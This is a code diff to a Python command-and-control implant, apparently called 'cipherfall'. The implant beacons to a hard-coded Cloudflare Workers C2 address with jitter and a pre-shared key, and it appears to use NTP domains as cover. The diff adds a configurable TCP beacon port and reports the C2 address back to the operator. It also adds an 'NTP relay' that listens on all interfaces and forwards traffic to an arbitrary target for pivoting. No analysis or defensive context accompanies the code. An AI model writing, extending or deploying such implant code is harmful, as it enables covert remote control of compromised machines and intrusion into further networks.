@@ -108,10 +108,15 @@ import time, urllib.error, urllib.request, zlib
 C2_PSK      = os.environ.get("C2_PSK",        "changeme")
 BEACON_INT  = int(os.environ.get("C2_INT",    "60"))
 JITTER      = int(os.environ.get("C2_JITTER", "30"))
-WORKER_URL  = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
-RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
-RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")
+WORKER_URL       = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
+RELAY_PORT       = int(os.environ.get("C2_RELAY_PORT",     "0"))
+RELAY_BIND       = os.environ.get("C2_RELAY_BIND",         "0.0.0.0")
+TCP_PORT         = int(os.environ.get("C2_TCP_PORT",       "443"))
+NTP_RELAY_PORT   = int(os.environ.get("C2_NTP_RELAY_PORT", "0"))
+NTP_RELAY_TARGET = os.environ.get("C2_NTP_RELAY_TARGET",   "")
 MAX_OUTPUT = 900
+
+_C2_IP = ""
 
 _NTP_DOMAINS = {
     "ubuntu":   "ntp.ubuntu.com",
@@ -344,8 +349,8 @@ def _sysinfo():
         "os":         platform.system(),
         "release":    platform.release(),
         "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
-        "relay_port": RELAY_PORT,
-        "worker_url": WORKER_URL,
+        "relay_port": NTP_RELAY_PORT or RELAY_PORT,
+        "worker_url": (f"tcp://{_C2_IP}:{TCP_PORT}" if _C2_IP else WORKER_URL),
         "beacon_int": BEACON_INT,
     }
 
@@ -410,7 +415,7 @@ def _beacon(c2_ip):
         tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp.settimeout(10)
         try:
-            tcp.connect((c2_ip, 443))
+            tcp.connect((c2_ip, TCP_PORT))
             tcp.sendall(struct.pack("!H", len(pkt)) + pkt)
             rlen = struct.unpack("!H", _recvexact(tcp, 2))[0]
             data = _recvexact(tcp, rlen)
@@ -475,13 +480,42 @@ def _start_relay():
     threading.Thread(target=srv.serve_forever, daemon=True).start()
 
 
+class _NTPRelayHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        host, port_s = NTP_RELAY_TARGET.rsplit(":", 1)
+        try:
+            with socket.create_connection((host, int(port_s)), timeout=10) as up:
+                def _pipe(src, dst):
+                    try:
+                        while chunk := src.recv(8192):
+                            dst.sendall(chunk)
+                    except Exception:
+                        pass
+                t = threading.Thread(target=_pipe, args=(up, self.request), daemon=True)
+                t.start()
+                _pipe(self.request, up)
+                t.join()
+        except Exception:
+            pass
+
+
+def _start_ntp_relay():
+    srv = socketserver.ThreadingTCPServer(("0.0.0.0", NTP_RELAY_PORT), _NTPRelayHandler)
+    srv.daemon_threads = True
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+
 def main():
+    global _C2_IP
     if len(sys.argv) > 1 and sys.argv[1] == "--id":
         print(AGENT_ID)
         return
     if RELAY_PORT:
         _start_relay()
+    if NTP_RELAY_PORT and NTP_RELAY_TARGET:
+        _start_ntp_relay()
     c2_ip = _resolve_c2()
+    _C2_IP = c2_ip
     tick  = 0
     while True:
         try:
@@ -491,6 +525,7 @@ def main():
         if tick % 10 == 0:
             try:
                 c2_ip = _resolve_c2()
+                _C2_IP = c2_ip
             except Exception:
                 pass
         tick += 1
